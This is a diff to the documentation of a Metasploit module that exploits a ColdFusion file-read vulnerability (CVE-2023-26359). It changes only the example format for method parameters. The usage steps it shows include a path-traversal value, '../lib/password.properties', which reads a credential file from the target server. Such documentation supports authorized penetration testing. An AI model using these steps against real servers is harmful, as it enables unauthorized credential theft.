@@ -40,7 +40,7 @@ component testing {
 3. `set RHOSTS <TARGET_IP_ADDRESS>`
 4. `set CFC_ENDPOINT /testing.cfc`
 5. `set CFC_METHOD foo`
-6. Optionally `set CFC_METHOD_PARAMETERS param1=foo&param2=bar` if the CFC_METHOD requires parameters.
+6. Optionally `set CFC_METHOD_PARAMETERS param1=foo, param2=bar` if the CFC_METHOD requires parameters.
 7. `set TARGETFILE ../lib/password.properties`
 8. `set STORE_LOOT false` if you want to display file on the console instead of storing it as loot.
 9. `run`
@@ -57,7 +57,7 @@ Module options (auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26359):
    CFC_ENDPOINT           /testing.cfc                yes       The target ColdFusion Component (CFC) endpoint
    CFC_METHOD             foo                         yes       The target ColdFusion Component (CFC) remote method name
    CFC_METHOD_PARAMETERS                              no        The target ColdFusion Component (CFC) remote method parameters
-                                                                 (e.g. "param1=foo&param2=bar")
+                                                                 (e.g. "param1=foo, param2=bar")
    Proxies                                            no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS                 172.23.13.12                yes       The target host(s), see https://docs.metasploit.com/docs/using
                                                                 -metasploit/basics/using-metasploit.html
